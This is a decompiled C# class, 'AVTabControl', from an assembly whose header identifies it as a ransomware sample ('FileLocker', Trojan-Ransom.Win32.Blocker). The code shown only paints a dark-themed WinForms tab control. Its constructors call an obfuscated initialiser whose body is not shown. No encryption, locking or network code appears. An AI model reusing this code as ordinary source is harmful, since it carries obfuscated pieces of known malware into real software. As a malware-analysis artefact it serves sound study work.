// Decompiled with JetBrains decompiler
// Type: FileLocker.AVTabControl
// Assembly: FileLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E5EE51A-6914-4180-A10A-8B6B85AFF127
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Ransom.Win32.Blocker.ibjo-459a487b0ad80fc56c06fca73eb80b3268bd423eaf6da5a1b400a7b5c19fb957.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace FileLocker
{
  internal class AVTabControl : TabControl
  {
    private static List<WeakReference> __ENCList;
    private bool _DrawBottomBorder;
    private Pen _BorderColor;
    private StringAlignment _TextAlignment;
    private Rectangle R1;
    private Rectangle R2;
    private Pen P1;
    private Pen P2;
    private SolidBrush B1;
    private SolidBrush B2;
    private SolidBrush B3;
    private LinearGradientBrush GB1;
    private LinearGradientBrush GB2;
    private TabPage TP1;
    private StringFormat SF1;
    private int ItemHeight;
    private Size S1;
    private Rectangle REC;
    private LinearGradientBrush BR1;
    private Graphics G;
    private int HoverIndex;

    [DebuggerNonUserCode]
    static AVTabControl()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      AVTabControl.__ENCList = new List<WeakReference>();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object object_0)
    {
      lock (AVTabControl.__ENCList)
      {
        if (AVTabControl.__ENCList.Count == AVTabControl.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (AVTabControl.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (AVTabControl.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                AVTabControl.__ENCList[index1] = AVTabControl.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          AVTabControl.__ENCList.RemoveRange(index1, checked (AVTabControl.__ENCList.Count - index1));
          AVTabControl.__ENCList.Capacity = AVTabControl.__ENCList.Count;
        }
        AVTabControl.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
      }
    }

    public bool DrawBottomBorder
    {
      get => this._DrawBottomBorder;
      set
      {
        this._DrawBottomBorder = value;
        this.Invalidate();
      }
    }

    public Color BorderColor
    {
      get => this._BorderColor.Color;
      set
      {
        this._BorderColor = new Pen(value);
        this.Invalidate();
      }
    }

    public StringAlignment TextAlignment
    {
      get => this._TextAlignment;
      set
      {
        this._TextAlignment = value;
        this.Invalidate();
      }
    }

    public AVTabControl()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      AVTabControl.__ENCAddToList((object) this);
      this._BorderColor = Pens.Black;
      this._TextAlignment = StringAlignment.Near;
      this.REC = new Rectangle();
      this.HoverIndex = -1;
      this.SetStyle(ControlStyles.UserPaint | ControlStyles.Opaque | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
      this.SizeMode = TabSizeMode.Fixed;
      this.Alignment = TabAlignment.Left;
      this.ItemSize = new Size(50, 50);
      this.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point);
      this.DrawMode = TabDrawMode.OwnerDrawFixed;
      this.P1 = new Pen(Color.FromArgb(94, 94, 94));
      this.P2 = new Pen(Color.FromArgb(17, 17, 17));
      this.B1 = new SolidBrush(Color.FromArgb(38, 38, 38));
      this.B2 = new SolidBrush(Color.FromArgb(35, 35, 35));
      this.B3 = new SolidBrush(Color.FromArgb(5, Color.White));
      this.SF1 = new StringFormat();
      this.SF1.LineAlignment = StringAlignment.Center;
      try
      {
        foreach (TabPage tabPage in this.TabPages)
          tabPage.BackColor = Color.FromArgb(242, 242, 242);
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }

    protected override void OnControlAdded(ControlEventArgs e)
    {
      if (e.Control is TabPage)
      {
        try
        {
          foreach (TabPage control in this.Controls)
          {
            TabPage tabPage = new TabPage();
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        e.Control.BackColor = Color.FromArgb(242, 242, 242);
      }
      base.OnControlAdded(e);
    }

    protected override void OnPaint(PaintEventArgs e)
    {
      Font font1 = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point);
      this.G = e.Graphics;
      this.G.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
      this.G.SmoothingMode = SmoothingMode.AntiAlias;
      this.G.Clear(Color.FromArgb(242, 242, 242));
      this.ItemHeight = checked (this.ItemSize.Height + 2);
      this.G.FillRectangle((Brush) this.B1, 0, 0, this.ItemHeight, this.Height);
      this.G.DrawRectangle(Pens.Black, 0, 0, this.ItemHeight, this.Height);
      Pen pen = new Pen((Brush) new SolidBrush(Color.FromArgb(51, 51, 51)));
      int num = checked (this.TabCount - 1);
      int index = 0;
      while (index <= num)
      {
        this.R1 = this.GetTabRect(index);
        checked { --this.R1.Y; }
        checked { ++this.R1.Width; }
        checked { --this.R1.X; }
        this.TP1 = this.TabPages[index];
        Rectangle rectangle;
        if (this.SelectedIndex == index)
        {
          using (LinearGradientBrush linearGradientBrush = new LinearGradientBrush(this.R1, Color.FromArgb(26, 26, 26), Color.FromArgb(17, 17, 17), 90f))
          {
            linearGradientBrush.InterpolationColors = new ColorBlend()
            {
              Colors = new Color[3]
              {
                Color.FromArgb(25, 25, 25),
                Color.FromArgb(17, 17, 17),
                Color.FromArgb(25, 25, 25)
              },
              Positions = new float[3]{ 0.0f, 0.5f, 1f }
            };
            this.G.FillRectangle((Brush) linearGradientBrush, this.R1);
          }
          this.G.DrawLine(pen, this.R1.Left, checked (this.R1.Y - 1), checked (this.R1.Width + 1), checked (this.R1.Y - 1));
          if (this.HoverIndex == index)
            this.G.FillRectangle((Brush) this.B3, this.R1);
          checked { this.R1.X += 5; }
          checked { this.R1.Width -= 14; }
          this.R2 = this.R1;
          checked { ++this.R2.Y; }
          checked { ++this.R2.X; }
          this.SF1.Alignment = this._TextAlignment;
          Graphics g = this.G;
          string text = this.TP1.Text;
          Font font2 = this.Font;
          Brush white = Brushes.White;
          rectangle = new Rectangle(checked (this.R2.Left + 33), checked (this.R2.Top - 1), checked (this.R2.Width - 43), this.R2.Height);
          RectangleF layoutRectangle = (RectangleF) rectangle;
          StringFormat sf1 = this.SF1;
          g.DrawString(text, font2, white, layoutRectangle, sf1);
          try
          {
            this.G.DrawImage(this.ImageList.Images[this.TabPages[index].ImageIndex], checked (this.R1.X + 1), checked (this.R1.Y + 11), 32, 32);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          SolidBrush solidBrush1 = new SolidBrush(Color.FromArgb(38, 38, 38));
          checked { --this.R1.Y; }
          this.G.FillRectangle((Brush) solidBrush1, this.R1);
          this.G.DrawLine(pen, this.R1.X, this.R1.Y, this.R1.Right, this.R1.Y);
          if (this.HoverIndex == index)
            this.G.FillRectangle((Brush) this.B3, this.R1);
          SolidBrush solidBrush2 = new SolidBrush(Color.FromArgb(140, Color.Black));
          this.G.DrawLine(this.P2, this.R1.X, checked (this.R1.Bottom - 1), this.R1.Right, checked (this.R1.Bottom - 1));
          checked { this.R1.X += 5; }
          checked { this.R1.Width -= 14; }
          this.R2 = this.R1;
          checked { ++this.R2.Y; }
          checked { ++this.R2.X; }
          this.SF1.Alignment = this._TextAlignment;
          Graphics g = this.G;
          string text = this.TP1.Text;
          Font font3 = this.Font;
          Brush gray = Brushes.Gray;
          rectangle = new Rectangle(checked (this.R2.Left + 33), checked (this.R2.Top - 1), checked (this.R2.Width - 43), this.R2.Height);
          RectangleF layoutRectangle = (RectangleF) rectangle;
          StringFormat sf1 = this.SF1;
          g.DrawString(text, font3, gray, layoutRectangle, sf1);
          try
          {
            this.G.DrawImage(this.ImageList.Images[this.TabPages[index].ImageIndex], checked (this.R1.X + 2), checked (this.R1.Y + 11), 32, 32);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        this.G.DrawLine(pen, checked (this.R1.Right + 8), this.R1.Top, checked (this.R1.Right + 8), checked (this.R1.Bottom - 3));
        checked { ++index; }
      }
      this.G.DrawLine(Pens.Black, 0, 0, checked (this.R2.Height - 9), 0);
      this.G.DrawLine(this._BorderColor, this.ItemHeight, 0, this.ItemHeight, this.Height);
      this.G.DrawLine(pen, checked (this.R1.Left - 5), checked (this.ItemSize.Width * this.TabCount), checked (this.R1.Right + 8), checked (this.ItemSize.Width * this.TabCount));
      if (this._DrawBottomBorder)
        this.G.DrawLine(this._BorderColor, 0, checked (this.Height - 1), this.Width, checked (this.Height - 1));
      this.G.DrawLine(pen, checked (this.R1.Left - 5), checked (this.TabCount * (this.R1.Width + 12) + this.TabCount * 2), checked (this.R1.Left - 5), 1);
    }

    protected override void OnMouseMove(MouseEventArgs e)
    {
      int num = checked (this.TabPages.Count - 1);
      int index = 0;
      while (index <= num)
      {
        if (!this.GetTabRect(index).Contains(e.Location))
        {
          checked { ++index; }
        }
        else
        {
          this.HoverIndex = index;
          break;
        }
      }
      this.Invalidate();
      base.OnMouseMove(e);
    }

    protected override void OnMouseLeave(EventArgs e)
    {
      this.HoverIndex = -1;
      this.Invalidate();
      base.OnMouseLeave(e);
    }
  }
}
